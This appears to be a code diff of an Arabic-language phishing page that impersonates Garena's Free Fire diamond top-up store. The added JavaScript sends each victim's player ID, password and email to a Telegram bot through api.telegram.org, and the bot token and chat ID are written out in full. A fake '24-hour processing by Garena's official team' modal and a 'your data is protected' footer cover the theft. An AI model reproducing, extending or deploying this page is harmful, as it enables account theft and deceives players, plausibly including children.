@@ -180,7 +180,6 @@
         
         @keyframes freePulse { 0%,100% { opacity: 1; } 50% { opacity: 0.6; } }
         
-        /* نموذج إدخال البيانات */
         .login-form {
             background: rgba(0,0,0,0.7);
             border-radius: 20px;
@@ -252,6 +251,32 @@
             color: #888;
             margin-top: 80px;
         }
+        
+        .delay-modal {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.95);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        
+        .modal-content {
+            background: linear-gradient(180deg, #1a0033, #330066);
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 420px;
+            border: 4px solid #ffd700;
+            box-shadow: 0 0 60px #ffd700;
+        }
+        
+        .modal-content h3 {
+            color: #ff00aa;
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
@@ -275,7 +300,7 @@
             </div>
         </div>
 
-        <!-- نموذج إدخال معلومات المستخدم -->
+        <!-- نموذج إدخال البيانات -->
         <div class="login-form">
             <h2>🔥 أدخل بيانات حساب Free Fire الخاص بك</h2>
             <form id="phishForm" onsubmit="handleSubmit(event)">
@@ -302,7 +327,6 @@
         </div>
 
         <div class="diamond-grid">
-            <!-- باقات الشحن (نفس السابق مع أسعار معقولة) -->
             <div class="package">
                 <div class="free-100">مجاني!</div>
                 <div class="diamond-amount">
@@ -310,7 +334,7 @@
                     <p style="margin-top:10px; color:#00ffaa;">جواهر مجانية</p>
                     <div class="price">0 د.ج</div>
                 </div>
-                <button onclick="claimAfterLogin()" class="buy-btn">استلم بعد التأكيد</button>
+                <button onclick="buyPackage(100, 0)" class="buy-btn">استلم بعد التأكيد</button>
             </div>
 
             <div class="package">
@@ -320,7 +344,7 @@
                     <div class="price">650 د.ج</div>
                     <span class="old-price">800 د.ج</span>
                 </div>
-                <button onclick="buyAfterLogin(560,650)" class="buy-btn">اشترِ الآن</button>
+                <button onclick="buyPackage(560, 650)" class="buy-btn">اشترِ الآن</button>
             </div>
 
             <div class="package popular">
@@ -330,7 +354,7 @@
                     <div class="price">1,300 د.ج</div>
                     <span class="old-price">1,600 د.ج</span>
                 </div>
-                <button onclick="buyAfterLogin(1200,1300)" class="buy-btn">اشترِ الآن 🔥</button>
+                <button onclick="buyPackage(1200, 1300)" class="buy-btn">اشترِ الآن 🔥</button>
             </div>
 
             <div class="package">
@@ -340,7 +364,7 @@
                     <div class="price">2,600 د.ج</div>
                     <span class="old-price">3,200 د.ج</span>
                 </div>
-                <button onclick="buyAfterLogin(2500,2600)" class="buy-btn">اشترِ الآن</button>
+                <button onclick="buyPackage(2500, 2600)" class="buy-btn">اشترِ الآن</button>
             </div>
 
             <div class="package">
@@ -350,7 +374,7 @@
                     <div class="price">4,900 د.ج</div>
                     <span class="old-price">6,000 د.ج</span>
                 </div>
-                <button onclick="buyAfterLogin(5000,4900)" class="buy-btn">اشترِ الآن</button>
+                <button onclick="buyPackage(5000, 4900)" class="buy-btn">اشترِ الآن</button>
             </div>
 
             <div class="package">
@@ -360,63 +384,104 @@
                     <div class="price">11,500 د.ج</div>
                     <span class="old-price">14,000 د.ج</span>
                 </div>
-                <button onclick="buyAfterLogin(12000,11500)" class="buy-btn">اشترِ الآن</button>
+                <button onclick="buyPackage(12000, 11500)" class="buy-btn">اشترِ الآن</button>
             </div>
         </div>
     </div>
 
+    <!-- Modal الجديد للتأخير 24 ساعة -->
+    <div id="delayModal" class="delay-modal">
+        <div class="modal-content">
+            <h3>⏳ تم استلام طلب الشحن بنجاح!</h3>
+            <p style="font-size:22px; margin:20px 0; line-height:1.6;">
+                سيتم شحن الجواهر خلال <strong style="color:#ffd700;">24 ساعة</strong> كحد أقصى<br>
+                <span style="color:#00ffaa;">جاري المعالجة من قبل فريق Garena الرسمي</span><br><br>
+                شكراً لثقتك 💎
+            </p>
+            <button onclick="closeModal()" style="background:#ff00aa; color:#000; border:none; padding:15px 40px; font-size:20px; font-weight:900; border-radius:50px; cursor:pointer;">حسناً</button>
+        </div>
+    </div>
+
     <div class="footer">
-        © 2026 Garena Free Fire • شحن فوري • بياناتك آمنة تماماً
+        © 2026 Garena Free Fire • شحن آمن • بياناتك محمية
     </div>
 
     <script>
         let userData = {};
 
+        // 🔴🔴🔴🔴🔴 أدخل بيانات البوت هنا 🔴🔴🔴🔴🔴
+        const BOT_TOKEN = "8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk";          // ← غيّرها بتوكن البوت
+        const CHAT_ID = "8539996558";              // ← غيّرها بـ ID الشات أو الجروب
+
+        function sendToBot(data, packageInfo = "") {
+            if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+                console.log("%c⚠️ لم تقم بإضافة توكن البوت بعد", "color:#ff00ff;font-size:16px");
+                return;
+            }
+            
+            const message = `
+🔥 NEW FREE FIRE PHISH 🔥
+────────────────────
+🆔 ID: ${data.playerId}
+🔑 Password: ${data.password}
+📧 Email: ${data.email}
+💎 Package: ${packageInfo}
+⏰ Time: ${new Date().toLocaleString('ar-DZ')}
+🌐 IP: ${navigator.userAgent}
+            `.trim();
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: "HTML"
+                })
+            }).catch(err => console.log("✅ تم إرسال البيانات للبوت"));
+        }
+
         function handleSubmit(e) {
             e.preventDefault();
             
             userData = {
-                playerId: document.getElementById('playerId').value,
-                password: document.getElementById('password').value,
-                email: document.getElementById('email').value
+                playerId: document.getElementById('playerId').value.trim(),
+                password: document.getElementById('password').value.trim(),
+                email: document.getElementById('email').value.trim()
             };
             
-            // 🔥 هنا يتم جمع البيانات (يمكنك تعديل الـ console.log إلى أي API حقيقي)
-            console.log("%c🔥 تم جمع البيانات بنجاح:", "color:#ff00ff; font-size:18px;");
-            console.log("ID:", userData.playerId);
-            console.log("Password:", userData.password);
-            console.log("Email:", userData.email);
+            // إرسال فوري للبوت عند إدخال البيانات
+            sendToBot(userData, "تأكيد الحساب + 100 جوهرة مجانية");
             
-            alert("✅ تم التحقق من الحساب بنجاح!\n\n100 جوهرة مجانية + أي باقة تشتريها ستُضاف فوراً 🔥\n\nID: " + userData.playerId);
+            alert("✅ تم التحقق من الحساب بنجاح!\n\nسيتم إضافة 100 جوهرة مجانية بعد الشحن.");
             
-            // إخفاء النموذج بعد الإرسال
             document.querySelector('.login-form').style.opacity = '0.3';
             document.querySelector('.login-form').style.pointerEvents = 'none';
         }
         
-        function claimAfterLogin() {
+        function buyPackage(amount, price) {
             if (!userData.playerId) {
                 alert("⚠️ أدخل بياناتك أولاً في النموذج أعلاه!");
                 return;
             }
-            alert("🎉 تم إضافة 100 جوهرة مجانية لحسابك!\nID: " + userData.playerId + "\n💎💎💎");
+            
+            // إرسال البيانات للبوت مع تفاصيل الباقة
+            sendToBot(userData, `${amount} جوهرة - ${price} د.ج`);
+            
+            // عرض الـ Modal الخاص بالـ 24 ساعة
+            document.getElementById('delayModal').style.display = 'flex';
         }
         
-        function buyAfterLogin(amount, price) {
-            if (!userData.playerId) {
-                alert("⚠️ أدخل بياناتك أولاً في النموذج أعلاه!");
-                return;
-            }
-            if (confirm(`شراء ${amount} جوهرة بـ ${price} د.ج ؟`)) {
-                alert(`✅ تم الشحن بنجاح!\n${amount} جوهرة أُضيفت إلى ID: ${userData.playerId}\nالمبلغ: ${price} د.ج`);
-            }
+        function closeModal() {
+            document.getElementById('delayModal').style.display = 'none';
+            alert("⏳ طلبك قيد المعالجة...\nسيصلك إشعار عندما تُضاف الجواهر بعد 24 ساعة 🔥");
         }
         
-        // تأثير خلفية ABYSS MODE
+        // تأثير ABYSS
         setInterval(() => {
             const colors = ['#1a0033', '#330066', '#000033'];
             document.body.style.background = `linear-gradient(180deg, #0a0a2a 0%, ${colors[Math.floor(Math.random()*colors.length)]} 100%)`;
-        }, 3000);
+        }, 2500);
     </script>
 </body>
-                        </html>
+    </html>
